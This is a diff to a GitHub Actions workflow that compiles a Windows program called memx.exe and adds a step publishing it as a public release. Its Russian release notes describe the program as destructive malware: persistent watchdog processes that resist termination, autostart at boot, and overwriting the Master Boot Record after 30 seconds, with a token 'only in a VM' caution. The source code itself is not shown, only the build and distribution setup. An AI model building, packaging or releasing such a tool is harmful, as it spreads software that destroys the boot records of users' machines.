@@ -10,18 +10,46 @@ jobs:
     runs-on: windows-latest
     
     steps:
-    - uses: actions/checkout@v4
+    - name: Checkout code
+      uses: actions/checkout@v4
     
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
     
-    - name: Build
+    - name: Build EXE
       shell: cmd
       run: |
         cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib /SUBSYSTEM:WINDOWS /OUT:memx.exe
     
-    - name: Upload
+    - name: Upload EXE (Artifact)
       uses: actions/upload-artifact@v4
       with:
         name: memx
         path: memx.exe
+    
+    - name: Create Release
+      uses: softprops/action-gh-release@v1
+      with:
+        files: memx.exe
+        tag_name: v1.0.${{ github.run_number }}
+        name: MEMX v1.0.${{ github.run_number }}
+        body: |
+          # MEMX - ABSOLUTE PIZDEC
+          
+          ## Что внутри:
+          - 29 ультра-эффектов
+          - Защита от завершения (3 watchdog)
+          - Запись в MBR через 30 секунд
+          - Автозапуск при старте Windows
+          
+          ## Запуск:
+          1. Запусти от имени администратора
+          2. ТОЛЬКО В ВИРТУАЛКЕ!
+          
+          ## ВНИМАНИЕ:
+          - УНИЧТОЖАЕТ MBR!
+          - Восстановление через загрузочную флешку!
+        draft: false
+        prerelease: false
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
